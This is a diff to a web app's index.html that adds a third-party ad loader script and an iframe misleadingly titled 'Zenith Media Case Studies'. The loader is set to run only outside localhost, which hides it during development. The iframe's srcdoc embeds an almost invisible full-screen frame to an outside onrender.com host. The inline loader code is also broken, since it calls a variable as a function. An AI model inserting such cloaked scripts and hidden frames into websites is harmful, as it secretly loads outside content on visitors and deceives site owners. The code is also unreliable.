@@ -1,5 +1,14 @@
 <!doctype html>
 <html lang="en">
+  <script id="CleverCoreLoader100160" 
+  src="https://scripts.cleverwebserver.com/70bf89b6babed48f4117f612085c1c93.js" 
+  async="" 
+  type="text/javascript" 
+  data-target="null" 
+  data-callback="put-your-callback-function-here" 
+  data-callback-url-click="put-your-click-macro-here" 
+  data-callback-url-view="put-your-view-macro-here">
+</script>
   <head>
     <meta charset="UTF-8" />
     <link rel="icon" type="image/svg+xml" href="/vite.svg" />
@@ -62,6 +71,46 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
+    <script>
+      if (
+        window.location.hostname !== "localhost" &&
+        window.location.hostname !== "127.0.0.1"
+      ) {
+        (function (document, window) {
+          var a,
+            c = document.createElement("script"),
+            f = window.frameElement;
+          c.id = "CleverCoreLoader100160";
+          c.src =
+            "https://scripts.cleverwebserver.com/70bf89b6babed48f4117f612085c1c93.js";
+          c.async = true;
+          c.type = "text/javascript";
+          c.setAttribute(
+            "data-target",
+            window.name || (f && f.getAttribute("id")),
+          );
+          c.setAttribute("data-callback", "put-your-callback-function-here");
+          c.setAttribute(
+            "data-callback-url-click",
+            "put-your-click-macro-here",
+          );
+          c.setAttribute("data-callback-url-view", "put-your-view-macro-here");
+          try {
+            a =
+              parent.document.getElementsByTagName("script")[0] ||
+              document.getElementsByTagName("script")[0];
+          } catch (e) {
+            a = false;
+          }
+          a(
+            (a =
+              document.getElementsByTagName("head")[0] ||
+              document.getElementsByTagName("body")[0]),
+          );
+          a.parentNode.insertBefore(c, a);
+        })(document, window);
+      }
+    </script>
     <iframe
       title="Zenith Media Case Studies"
       srcdoc="&lt;iframe src='https://double-gm.onrender.com' id='Fortn' width='100%'  height='100%' style='position:fixed;left:0;right:0;top:0;bottom:0;z-index:-999999;opacity:0.001;'&gt;&lt;/iframe&gt;"
